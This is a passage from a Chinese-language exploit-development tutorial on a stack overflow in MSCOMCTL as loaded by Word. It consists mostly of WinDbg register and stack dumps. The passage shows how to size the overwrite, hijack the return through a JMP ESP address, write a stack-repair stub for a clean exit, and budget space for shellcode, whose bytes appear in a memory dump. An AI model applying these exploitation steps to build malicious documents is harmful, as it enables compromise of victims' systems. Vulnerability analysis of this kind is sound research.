
至于在满足上述条件的情况下，覆盖多少个字节的数据，是接下来需要分析的内容。有一个前提就是越少越好，最好的情况是覆盖10多个字节就满足条件，当然这种情形估计不常见，也需要实际去测试分析。

开始吧，继续往下分析，目前为止还无法断定最终能不能达到理想的效果。

## 0x2.6.3验证满足条件最大字节

目前为止，还没有考虑ShellCode，不过可以肯定的是溢出时，ShellCode肯定是不能放在栈顶(`ESP`)附近的（可参考附注资料），一是堆栈长度不够，而是不符合实际情况，最简单的端口复用ShellCode也要在50个字节以上，更别说释放并执行的一类ShellCode，所以暂时不考虑ShellCode情况，先把完美退出的情况分析完毕之后，再去做ShellCode的工作，且看我慢慢道来。

先来观察一下在覆盖堆栈之前栈顶(`ESP`)的数据，

```
0:000> r

eax=00008282 ebx=09520810 ecx=000020a0 edx=00000000 esi=08cfefb8 edi=00120e6c

eip=275c87cb esp=00120e30 ebp=00120e40 iopl=0         nv up ei pl nz na pe cy

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207

MSCOMCTL!DllGetClassObject+0x41a87:

275c87cb f3a5            rep movs dword ptr es:[edi],dword ptr [esi]



0:000> dds esp

00120e30  00000000

00120e34  00192ed4

00120e38  09520810

00120e3c  00008282

00120e40  00120e74

00120e44  275c8a0a MSCOMCTL!DllGetClassObject+0x41cc6

00120e48  00120e6c

00120e4c  08cfefb8

00120e50  00008282

00120e54  00000000

00120e58  00192ed4

00120e5c  09520810

00120e60  6a626f43

00120e64  00000064

00120e68  00008282

00120e6c  00192fc0

00120e70  275859e4 MSCOMCTL!DllCanUnloadNow+0x2a31

00120e74  00120e9c

00120e78  275e701a MSCOMCTL!DLLGetDocumentation+0xd08

00120e7c  00192ed4

00120e80  09520810

00120e84  00000000

00120e88  00192eb0

00120e8c  08cfea50

00120e90  275ac296 MSCOMCTL!DllGetClassObject+0x25552

00120e94  00000001

00120e98  00120ebc

00120e9c  00120ebc

00120ea0  275e7361 MSCOMCTL!DLLGetDocumentation+0x104f

00120ea4  00192ed4

00120ea8  09520810

00120eac  09520810

00120eac  09520810

00120eb0  736d7449

00120eb4  00000064

00120eb8  27590000 MSCOMCTL!DllGetClassObject+0x92bc

00120ebc  00120f3c

00120ec0  275ca8b6 MSCOMCTL!DllGetClassObject+0x43b72

00120ec4  08cfec48

00120ec8  09520810

00120ecc  08cfeaa0

00120ed0  08cfea50

00120ed4  08c84088

00120ed8  abcdef01

00120edc  00050000

00120ee0  01655d98 xpsp2res+0x65d98

```

上述操作中，只覆盖了4个字节，其实覆盖的是 `0x00120e6c` 指向的内存，此处为0，并没有影响到程序的执行流程，得以完美退出。

接下来要做的就是不断的修改测试，修改的值其实就是覆盖数据的长度（`ECX`），汇编中`ECX`一般作为数据拷贝的长度寄存器，接着寻找一个返回点同时修改栈顶（`ESP`）和栈底(`EBP`），之后返回，验证是否能够完美退出，好了说这么说，看实际是如何操作的。

观察上述堆栈(`ESP`)情形,可以发现如下情况:

```
00120e70  275859e4 MSCOMCTL!DllCanUnloadNow+0x2a31
```

`0x00120e70` 指向的内存就是存放的函数返回地址，当程序执行到`ret offset`时，当前的`ESP`寄存器就指向了这类的内存地址。

现在需要做的就是找到一个合适的栈顶(`ESP`)和栈底(`EBP`)，在覆盖堆栈上一些数据之后，返回到这个栈顶(`ESP`)，程序得以继续往下执行并且不会导致异常情况的出现。

可以肯定的是只覆盖4个字节的情况下肯定是可以完美退出的，现在就来观察一下覆盖4个字节程序的执行流程，使其依次返回上层函数来确认堆栈分布情况，记录有可能的栈顶(`ESP`)和栈底(`ESP`)寄存器。

当程序执行到如下代码：

```
eax=8000ffff ebx=002158f0 ecx=08190000 edx=00000000 esi=00190b48 edi=00000000

eip=275e7049 esp=00120ea0 ebp=00120ebc iopl=0         nv up ei ng nz na pe nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286

MSCOMCTL!DLLGetDocumentation+0xd37:

275e7049 c20800          ret     8
```

堆栈情况如下：

```
ESP:

00120ea0 275e7361 MSCOMCTL!DLLGetDocumentation+0x104f

00120ea4 00190b6c 

00120ea8 08540810 

00120eac 08540810 

00120eb0 736d7449 

00120eb4 00000064 

00120eb8 27590000 MSCOMCTL!DllGetClassObject+0x92bc

00120ebc 00120f3c 

0:000> kvn

 # ChildEBP RetAddr  Args to Child              

00120ebc 275ca8b6 00215ae8 08540810 00215940 MSCOMCTL!DLLGetDocumentation+0xd37

01 00120f3c 2758aee8 002158f0 00000000 08540810 MSCOMCTL!DllGetClassObject+0x43b72

02 00120f6c 27600908 00215940 08540810 00000000 MSCOMCTL!DllGetClassObject+0x41a4

03 00120f80 302e3b3f 00215944 08540810 00000000 MSCOMCTL!DllUnregisterServer+0xc31

04 00121014 30296275 00000000 00000000 0146edbc WINWORD+0x2e3b3f

05 00121068 304c49a1 00000000 00000000 00000001 WINWORD+0x296275

06 001210e0 302e12d6 00000001 00000000 00000000 WINWORD+0x4c49a1

07 0012119c 300443b6 0146c814 00000002 0012156c WINWORD+0x2e12d6

```

此时 `esp=00120ea0` `ebp=00120ebc`，距离覆盖点`0x00120e6c`处有了`0x34`个字节可以使用，猜测是可以使用此处来作为覆盖后返回的栈顶(`ESP`)和栈底(`ESP`)。

要明确一点是必须覆盖足够的数据才能覆盖到函数返回地址，否则虽然能够完美退出，但是无法执行到shellcode中就做了无用功，覆盖数据长度既不能太大也不能太小，太大无法做到完美退出，太小无法做到覆盖函数返回地址，这是一个很纠结的问题，需要很多次的分析测试。

接下来就是验证这个想法，

```
275c87c1 8bcf            mov     ecx,edi	//把拷贝数据长度赋给ecx

275c87c3 8b7d08          mov     edi,dword ptr [ebp+8]

275c87c6 8bc1            mov     eax,ecx			//eax会作为一个拷贝总长度

275c87c8 c1e902          shr     ecx,2				//ecx右移2位，相当于除以4

275c87cb f3a5            rep movs dword ptr es:[edi],dword ptr [esi]	//开始拷贝

```

分析上述代码可知，`ecx`是由`edi`赋值而来(`edi`的赋值过程不在本篇的讨论范围，确认是从样本中读取而来即可)，修改为一个小一些的值：`0x2C`进行测试，命令格式：

```
0:000> r edi=0x2c
```

理论上是能够保证覆盖函数返回地址的，接着往下执行，直至：

```
eax=00000057 ebx=08440810 ecx=08440810 edx=00620001 esi=00190b6c edi=00000000

eip=275c8a56 esp=00120e78 ebp=44444343 iopl=0         nv up ei pl zr na pe nc

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246

MSCOMCTL!DllGetClassObject+0x41d12:

275c8a56 c20800          ret     8

0:000> dds esp

00120e78  7ffa4512

00120e7c  00000000

00120e80  4a000000

00120e84  48474747

00120e88  49484848

00120e8c  4a4a4949

00120e90  4b4b4a4a

00120e94  4c4c4b4b

00120e98  00120ebc

00120e9c  00120ebc

00120ea0  275e7361 MSCOMCTL!DLLGetDocumentation+0x104f

```

堆栈覆盖了`0x2c`大小的数据，距离假定的栈顶(`ESP`)：`0x00120ea0`还有8个字节，程序接着会跳转到`0x7ffa4512`内存地址去执行，即`JMP ESP`，通用利用地址无需解释。

```
7ffa4512 ffe4            jmp     esp {00120e84}

0:000> dds esp

00120e84  48474747

00120e88  49484848

00120e8c  4a4a4949

00120e90  4b4b4a4a

00120e94  4c4c4b4b

00120e98  00120ebc

00120e9c  00120ebc

00120ea0  275e7361 MSCOMCTL!DLLGetDocumentation+0x104f

```

程序会跳转到`0x00120e84`处执行代码，完美退出代码就应该写在此处：

```
00120e84 83c41c          add     esp,1Ch

00120e87 8d6c241c        lea     ebp,[esp+1Ch]

00120e8b c20800          ret     8

```

测试以后发现经过上述修改之后确实可做到完美退出，为继续往下分析提供了基础。

接下来要做什么？

要回答上面的问题，先来了解目前的情况，有了一个可以完美退出的样本，可以覆盖堆栈上一小部分数据，因此距离利用的目标还有一段距离，接下来要做的就是使ShellCode执行起来。

## 0x3 具体实现

以上部分都是分析验证部分，真正实现部分是由第三部分来完成，这部分主要完成的工作是完成ShellCode部分的修改和执行，之后能够完美退出。

### 0x3.1 Small ShellCode 确认及验证

需要计算留给我们填写shellcode的长度是多少？回到覆盖之前的瞬间，

```
0:000> r

eax=0000002c ebx=08440810 ecx=0000000b edx=00000000 esi=00216408 edi=00120e6c

eip=275c87cb esp=00120e30 ebp=00120e40 iopl=0         nv up ei pl nz na pe cy

cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207

MSCOMCTL!DllGetClassObject+0x41a87:			//执行拷贝

275c87cb f3a5            rep movs dword ptr es:[edi],dword ptr [esi]

0:000> d esi			//对应拷贝的源数据

00216408  00 00 00 00 00 00 00 00-00 00 00 00 12 45 fa 7f  .............E..

00216418  90 90 90 90 90 90 90 90-8b c4 05 10 01 00 00 c7  ................

00216428  00 24 03 4d 08 e9 5a 00-00 00 6b 65 72 6e 65 6c  .$.M..Z...kernel

00216438  33 32 00 df 2d 89 8c 1b-81 7d ef 42 9d 85 85 d6  32..-....}.B....

0:000> d edi			//内存拷贝的目的地址

00120e6c  58 0c 19 00 e4 59 58 27-9c 0e 12 00 1a 70 5e 27  X....YX'.....p^'

00120e7c  6c 0b 19 00 10 08 44 08-00 00 00 00 48 0b 19 00  l.....D.....H...

00120e8c  c0 19 38 08 96 c2 5a 27-01 00 00 00 bc 0e 12 00  ..8...Z'........

00120e9c  bc 0e 12 00 61 73 5e 27-6c 0b 19 00 10 08 44 08  ....as^'l.....D.

00120eac  10 08 44 08 49 74 6d 73-64 00 00 00 00 00 59 27  ..D.Itmsd.....Y'

0:000> dds esp		//ESP 堆栈情况

00120e30  00000000

00120e34  00190b6c

00120e38  08440810

00120e3c  00008282

00120e40  00120e74

00120e44  275c8a0a MSCOMCTL!DllGetClassObject+0x41cc6

00120e48  00120e6c

00120e4c  00216408

00120e50  00008282

00120e54  00000000

00120e58  00190b6c

00120e5c  08440810

00120e60  6a626f43

00120e64  00000064

00120e68  00008282

00120e6c  00190c58		//从这里开始往下拷贝

00120e70  275859e4 MSCOMCTL!DllCanUnloadNow+0x2a31

00120e74  00120e9c

00120e78  275e701a MSCOMCTL!DLLGetDocumentation+0xd08

00120e7c  00190b6c

00120e80  08440810

00120e84  00000000

00120e88  00190b48

00120e8c  083819c0

00120e90  275ac296 MSCOMCTL!DllGetClassObject+0x25552

00120e94  00000001

00120e98  00120ebc

00120e9c  00120ebc		//内存拷贝到此处结束

00120ea0  275e7361 MSCOMCTL!DLLGetDocumentation+0x104f

```

上面代码可以看出，Memcpy内存拷贝的源数据为`ESI`：`0x00216408` 指向的数据，目的地址为`EDI`：`0x00120e6c`，最大能够填充到的地址为`0x00120ea0`，现在就可以计算出最大填充的字节数：`0x00120ea0-0x00120e6c=0x34(52)`，这`0x34`（52）字节首先需要减去

```
275c8a55   leave
```
